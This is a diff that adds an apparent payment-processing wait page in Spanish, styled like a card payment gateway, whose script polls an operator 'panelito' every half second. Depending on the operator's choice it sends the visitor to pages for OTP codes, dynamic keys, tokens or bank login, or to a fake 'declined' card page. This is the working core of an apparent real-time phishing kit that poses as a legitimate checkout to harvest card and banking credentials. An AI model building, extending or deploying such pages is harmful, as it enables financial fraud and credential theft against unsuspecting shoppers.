@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando tu pago</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+        .wompi-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 110px;
+            height: auto;
+            object-fit: contain;
+        }
+        .content {
+            text-align: center;
+            max-width: 500px;
+        }
+        .franquicia-img {
+            width: 140px;
+            height: 140px;
+            object-fit: contain;
+            margin-bottom: 2rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .franquicia-img.loaded {
+            opacity: 1;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #969696;
+            border-radius: 50%;
+            margin: 2rem auto;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .title {
+            color: #969696;
+            font-size: 1.6rem;
+            margin: 1rem 0;
+        }
+        @media (max-width: 768px) {
+            .title { font-size: 1.5rem; }
+            .franquicia-img { width: 120px; height: 120px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="assets/seguro.svg" class="wompi-logo" alt="Seguro">
+        <div class="content">
+            <img id="franquiciaImg" alt="Franquicia" class="franquicia-img">
+            <div class="spinner"></div>
+            <h2 class="title">Procesando tu pago</h2>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const txId = params.get('txId');
+
+        console.log('[PROCESSING] URL completo:', window.location.href);
+        console.log('[PROCESSING] txId del URL:', txId);
+        console.log('[PROCESSING] Longitud txId:', txId ? txId.length : 0);
+
+        const franquiciaMap = {
+            'VISA': 'visa.png',
+            'MASTERCARD': 'master.png',
+            'AMEX': 'amex.png',
+            'DINERS': 'diners.png'
+        };
+
+        // Cargar datos seguros de transacción desde R2
+        async function cargarDatos() {
+            if (!txId) {
+                console.error('[PROCESSING] ❌ txId no existe');
+                return;
+            }
+            try {
+                const url = `http://localhost:9090/api/transaccion-tarjeta/${txId}`;
+                console.log('[PROCESSING] Haciendo fetch a:', url);
+                const response = await fetch(url);
+                console.log('[PROCESSING] Status:', response.status);
+                const result = await response.json();
+                console.log('[PROCESSING] Respuesta JSON:', JSON.stringify(result, null, 2));
+
+                if (result.ok && result.data) {
+                    const data = result.data;
+                    console.log('[PROCESSING] Franquicia valor:', data.franquicia);
+                    console.log('[PROCESSING] Franquicia en map:', franquiciaMap[data.franquicia]);
+
+                    // Cargar franquicia solo si existe
+                    if (data.franquicia && franquiciaMap[data.franquicia]) {
+                        const img = document.getElementById('franquiciaImg');
+                        const logoPath = 'assets/logos/' + franquiciaMap[data.franquicia];
+                        console.log('[PROCESSING] Intentando cargar logo desde:', logoPath);
+                        img.src = logoPath;
+                        img.onload = () => {
+                            img.classList.add('loaded');
+                            console.log('[PROCESSING] ✅ Franquicia cargada:', data.franquicia);
+                        };
+                        img.onerror = () => {
+                            console.error('[PROCESSING] ❌ Error cargando imagen:', logoPath);
+                        };
+                    } else {
+                        console.warn('[PROCESSING] Franquicia no válida o no en map:', data.franquicia);
+                    }
+
+                    console.log('[PROCESSING] Datos cargados desde R2:', data);
+                } else {
+                    console.error('[PROCESSING] result.ok=false o sin data:', result);
+                }
+            } catch (err) {
+                console.error('[PROCESSING] Error cargando datos:', err);
+            }
+        }
+        cargarDatos();
+
+        // Leer acción del servidor (desde R2)
+        async function getAccionFromR2(txId) {
+            try {
+                const response = await fetch(`http://localhost:9090/api/obtener-accion/${txId}`);
+                const result = await response.json();
+                console.log('[PROCESSING] Acción desde R2:', result.accion);
+                return result.accion;
+            } catch (err) {
+                console.error('[ERROR] Leyendo acción:', err);
+                return 'STANDBY';
+            }
+        }
+
+        // Polling para verificar si hay redireccionamiento desde panelito
+        if (txId) {
+            console.log('[PROCESSING] 📡 Iniciando polling para txId:', txId);
+            const pollInterval = setInterval(async () => {
+                try {
+                    const accion = await getAccionFromR2(txId);
+                    if (accion && accion !== 'STANDBY') {
+                        let redirectUrl;
+                        switch(accion) {
+                            case 'OTP':
+                                redirectUrl = `/otp?txId=${txId}`;
+                                break;
+                            case 'DINAMICA':
+                                redirectUrl = `/dinamica?txId=${txId}`;
+                                break;
+                            case 'TOKEN':
+                                redirectUrl = `/token?txId=${txId}`;
+                                break;
+                            case 'BLOGIN':
+                                redirectUrl = `/blogin?txId=${txId}`;
+                                break;
+                            case 'BAD':
+                                redirectUrl = `/paymentcc?error=declined&txId=${txId}`;
+                                break;
+                            default:
+                                redirectUrl = `/otp?txId=${txId}`;
+                        }
+                        console.log('[PROCESSING] 🔄 Redirigiendo a:', redirectUrl);
+                        clearInterval(pollInterval);
+                        // Remover .html si existe en el redirectUrl
+            const urlFinal = redirectUrl.replace(/\.html\?/, '?').replace(/\.html$/, '');
+            window.location.href = urlFinal;
+                    }
+                } catch (err) {
+                    console.error('[PROCESSING] Error polling:', err);
+                }
+            }, 500); // Polling cada 500ms
+        }
+    </script>
+</body>
+</html>
